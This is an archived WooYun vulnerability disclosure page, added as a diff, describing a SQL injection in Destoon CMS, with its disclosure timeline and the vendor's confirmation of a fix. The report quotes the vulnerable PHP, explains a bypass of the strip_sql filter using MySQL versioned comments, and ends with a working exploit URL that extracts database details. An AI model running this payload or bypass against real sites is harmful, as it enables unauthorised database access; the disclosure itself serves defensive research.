@@ -1,0 +1,271 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Destoon最新全版本通杀SQL注入漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Destoon最新全版本通杀SQL注入漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Kavia">Kavia</a> 
+</li><li>提交时间：		2013-10-10 15:38</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-10：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-10：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-10-13：	细节向第三方安全合作伙伴开放<br/>
+									2013-10-20：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-10-30：	细节向普通白帽子公开<br/>
+									2013-11-19：	细节向实习白帽子公开<br/>
+									2014-01-08：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">Destoon最新全版本通杀注入漏洞</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">/common.inc.php	 64行：<br />
+<br />
+-------------------------------------------------------------------------------------<br />
+<br />
+if($_POST) $_POST = strip_sql($_POST);	//strip_sql()过滤<br />
+<br />
+if($_GET) $_GET = strip_sql($_GET);<br />
+<br />
+if($_COOKIE) $_COOKIE = strip_sql($_COOKIE);<br />
+<br />
+.........<br />
+<br />
+if($_POST) extract($_POST, EXTR_SKIP);	//注册变量<br />
+<br />
+if($_GET) extract($_GET, EXTR_SKIP);<br />
+<br />
+-------------------------------------------------------------------------------------<br />
+<br />
+<br />
+<br />
+跟进strip_sql()<br />
+<br />
+/include/global.func.php	186行：<br />
+<br />
+-------------------------------------------------------------------------------------<br />
+<br />
+function strip_sql($string) {<br />
+<br />
+$search = array(&quot;/union([[:space:]\/])/i&quot;,&quot;/select([[:space:]\/])/i&quot;,&quot;/update([[:space:]\/])/i&quot;,&quot;/replace([[:space:]\/])/i&quot;,&quot;/delete([[:space:]\/])/i&quot;,&quot;/drop([[:space:]\/])/i&quot;,&quot;/outfile([[:space:]\/])/i&quot;,&quot;/dumpfile([[:space:]\/])/i&quot;,&quot;/load_file\(/i&quot;,&quot;/substring\(/i&quot;,&quot;/ascii\(/i&quot;,&quot;/hex\(/i&quot;,&quot;/ord\(/i&quot;,&quot;/char\(/i&quot;);<br />
+<br />
+$replace = array(&#039;unio&amp;#110;\\1&#039;,&#039;selec&amp;#116;\\1&#039;,&#039;updat&amp;#101;\\1&#039;,&#039;replac&amp;#101;\\1&#039;,&#039;delet&amp;#101;\\1&#039;,&#039;dro&amp;#112;\\1&#039;,&#039;outfil&amp;#101;\\1&#039;,&#039;dumpfil&amp;#101;\\1&#039;,&#039;load_fil&amp;#101;(&#039;,&#039;substrin&amp;#103;(&#039;,&#039;asci&amp;#105;(&#039;,&#039;he&amp;#120;(&#039;,&#039;or&amp;#100;(&#039;,&#039;cha&amp;#114;(&#039;);<br />
+<br />
+return is_array($string) ? array_map(&#039;strip_sql&#039;, $string) : preg_replace($search, $replace, $string);<br />
+<br />
+}<br />
+<br />
+------------------------------------------------------------------------------------<br />
+<br />
+采用了新的正则表达式，之前西毒放出的exp，已经无法绕过新版本的过滤了。<br />
+<br />
+此处可采用新的绕过方式：/!5000union*/<br />
+<br />
+<br />
+<br />
+首先寻找一个注射点：<br />
+<br />
+/module/member/record.inc.php	16行：<br />
+<br />
+-------------------------------------------------------------------------------------------<br />
+<br />
+isset($mid) or $mid = 0;<br />
+<br />
+isset($currency) or $currency = &#039;&#039;;<br />
+<br />
+$module_select = module_select(&#039;mid&#039;, $L[&#039;module_name&#039;], $mid);<br />
+<br />
+if($keyword) $condition .= &quot; AND title LIKE &#039;%$keyword%&#039;&quot;;<br />
+<br />
+if($fromtime) $condition .= &quot; AND paytime&gt;&quot;.(strtotime($fromtime.&#039; 00:00:00&#039;));<br />
+<br />
+if($totime) $condition .= &quot; AND paytime&lt;&quot;.(strtotime($totime.&#039; 23:59:59&#039;));<br />
+<br />
+if($mid) $condition .= &quot; AND moduleid=$mid&quot;;<br />
+<br />
+if($itemid) $condition .= &quot; AND itemid=$itemid&quot;;<br />
+<br />
+if($currency) $condition .= &quot; AND currency=&#039;$currency&#039;&quot;;<br />
+<br />
+$r = $db-&gt;get_one(&quot;SELECT COUNT(*) AS num FROM {$DT_PRE}finance_pay WHERE $condition&quot;);//<br />
+<br />
+$pages = pages($r[&#039;num&#039;], $page, $pagesize);<br />
+<br />
+$lists = array();<br />
+<br />
+echo &quot;SELECT * FROM {$DT_PRE}finance_pay WHERE $condition ORDER BY pid DESC LIMIT $offset,$pagesize&quot;;<br />
+<br />
+$result = $db-&gt;query(&quot;SELECT * FROM {$DT_PRE}finance_pay WHERE $condition ORDER BY pid DESC LIMIT $offset,$pagesize&quot;);<br />
+<br />
+------------------------------------------------------------------------------<br />
+<br />
+此处利用变量覆盖，就可以顺利构造sql注入<br />
+<br />
+<br />
+<br />
+/member/record.php<br />
+<br />
+-----------------------------------------------------------------------------<br />
+<br />
+&lt;?php <br />
+<br />
+require &#039;config.inc.php&#039;;<br />
+<br />
+require &#039;../common.inc.php&#039;;<br />
+<br />
+require DT_ROOT.&#039;/module/&#039;.$module.&#039;/record.inc.php&#039;;<br />
+<br />
+?&gt;<br />
+<br />
+------------------------------------------------------------------------------<br />
+<br />
+引入了common.inc.php，所以存在变量覆盖。并且可以绕过正则的过滤。最终造成sql注入<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+exp：http://demo.destoon.com/v5.0/member/record.php?action=pay&amp;mid=-1/*!50000union*//*!50000select*/user(),2,database(),version(),5,6,7,8,9-- </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/10152403514016e12dc3769c00b8086a8e706009.jpg" target="_blank"><img src="../images/10152403514016e12dc3769c00b8086a8e706009.jpg" alt="QQ图片20131005131510.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们更懂 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Kavia" title="Kavia">Kavia</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-039281" title="Destoon最新全版本通杀SQL注入漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-10-10 20:01</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已经修复 详见 http://bbs.destoon.com/thread-54159-1-1.html</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="39281";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
